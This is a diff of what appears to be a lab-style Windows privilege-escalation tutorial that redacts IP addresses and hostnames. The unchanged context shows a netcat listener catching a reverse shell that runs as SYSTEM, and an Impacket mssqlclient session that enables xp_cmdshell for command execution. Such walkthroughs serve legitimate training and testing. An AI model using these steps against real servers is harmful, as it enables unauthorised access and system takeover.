@@ -172,7 +172,7 @@ If everything aligns:
 ```shell
 $ sudo nc -lvnp 8443
 listening on [any] 8443 ...
-connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332
+connect to [10.10.14.3] from (UNKNOWN) [10.0.43.30] 50332
 Microsoft Windows [Version 10.0.14393]
 (c) 2016 Microsoft Corporation. All rights reserved.
 
@@ -236,7 +236,7 @@ The receiver on the attacker:
 ```shell
 $ sudo nc -lvnp 8443
 listening on [any] 8443 ...
-connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847
+connect to [10.10.14.3] from (UNKNOWN) [10.0.43.30] 49847
 
 C:\Windows\system32>whoami
 nt authority\system
@@ -320,7 +320,7 @@ The most common real-world path to this attack: MSSQL service accounts via `xp_c
 [Impacket's mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) is the standard tool:
 
 ```shell
-$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth
+$ mssqlclient.py sql_dev@10.0.43.30 -windows-auth
 
 Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation
 
@@ -329,7 +329,7 @@ Password:
 [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
 [*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
 [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
-[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
+[*] INFO(SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
 [*] ACK: Result: 1 - Microsoft SQL Server (130 19162)
 SQL>
 ```
@@ -343,8 +343,8 @@ By default, `xp_cmdshell` is disabled. The shell has a built-in command to enabl
 ```sql
 SQL> enable_xp_cmdshell
 
-[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1.
-[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1.
+[*] INFO(SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1.
+[*] INFO(SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1.
 ```
 
 Enabling `xp_cmdshell` requires `sysadmin` role on the SQL instance. Not all SQL accounts have this. Check first:
